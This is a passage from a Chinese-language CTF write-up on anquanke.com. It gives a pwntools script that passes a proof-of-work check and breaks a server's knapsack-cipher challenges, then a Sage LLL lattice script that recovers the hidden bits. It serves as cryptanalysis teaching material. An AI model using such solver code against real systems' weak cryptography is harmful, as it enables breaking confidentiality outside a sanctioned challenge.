    proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, string.ascii_letters + string.digits, length=4, method='fixed')
    
    sh.sendline(proof)
    sh.recvuntil("knapsack.n")
    data=[]
    for _ in range(10):
        data.append(int(sh.recvline()[:-1]))
    #print(data)
    sh.recvuntil("[+]c = ")
    c = int(sh.recvuntil("n")[:-1])
    
    for i in range(2**10):
        if enc(data,i) == c:
            print i
            sh.sendline(hex(i)[2:])
            break
    else:
        print "no"
    sh.recvuntil("knapsack.n")
    data=[]
    for _ in range(50):
        data.append(int(sh.recvline()[:-1]))
    #print(data)
    
    data.reverse()
    sh.recvuntil("[+]c = ")
    c = int(sh.recvuntil("n")[:-1])
    m=""
    for i in data:
        if c>=i:
            m+='1'
            c-=i
        else:
            m+='0'
    print c
    if enc(data,int(m,2)) :
        m = m[::-1]
    m = int(m,2)
    sh.sendline(hex(m)[2:])
    sh.recvuntil("knapsack.n")
    data=[]
    for _ in range(100):
        data.append(int(sh.recvline()[:-1]))
    
    print("a = "+str(data).replace("L",""))
    sh.recvuntil("[+]c = ")
    c = int(sh.recvuntil("n")[:-1])
    print("s = "+str(c))
    
    sh.interactive()
    

拿到数据了去用sage解密

    
    
    a = #填入序列a
    s = #填入密文值
    
    m=[]
    for i in range(100):
        b=[]
        for j in range(100):
            if i == j:
                b.append(1)
            else:
                b.append(0)
        m.append(b)
    
    b=[]
    for i in range(100):
        m[i].append(2**156*a[i])
        b.append(1/2)
    
    b.append(2**156*s)
    m.append(b)
    #print(len(m[0])) 
    M = matrix(QQ, m)
    v = M.LLL()[0]
    print(v)
    flag=''
    for i in v[:-1]:
        if i < 0:
            flag+='0'
        else:
            flag+='1'
    print(hex(int(flag,2))[2:])
    

然后提交，碰点运气。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **V** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/206493](/post/id/206493)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [crypto](/tag/crypto)

 **+1** __2赞

 __收藏

![](https://p2.ssl.qhimg.com/t013485e4462a9b3b6d.png) V

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

